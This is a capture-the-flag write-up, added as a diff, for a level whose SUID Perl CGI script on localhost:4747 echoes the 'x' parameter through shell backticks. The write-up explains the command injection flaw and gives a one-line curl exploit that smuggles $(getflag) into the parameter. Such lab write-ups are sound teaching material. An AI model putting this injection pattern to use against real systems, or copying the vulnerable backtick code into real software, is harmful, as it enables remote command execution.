@@ -1,0 +1,24 @@
+For this level, we have again a file in our directory: "level04.pl"
+
+It seems that the file is a perl script that have the same s(SUID) permission as the previous level, which means we could run this as the owner, flag04.
+
+We can inspect the script with a simple cat:
+"cat level04.pl"
+
+We can see:
+
+"#!/usr/bin/perl
+# localhost:4747
+use CGI qw{param};
+print "Content-type: text/html\n\n";
+sub x {
+  $y = $_[0];
+  print `echo $y 2>&1`;
+}
+x(param("x"));"
+
+The 2 first lines means that this script is using "Common Gateway Interface" which allow us to execute it via web requests and the address is the localhost:4747.
+
+By looking into the core function we can see that they use the "x" get params and echo it with the system echo so you can exploit it as follow, because it's launched with the owner, flag04.
+
+`curl 'localhost:4747?x=$(getflag)'`
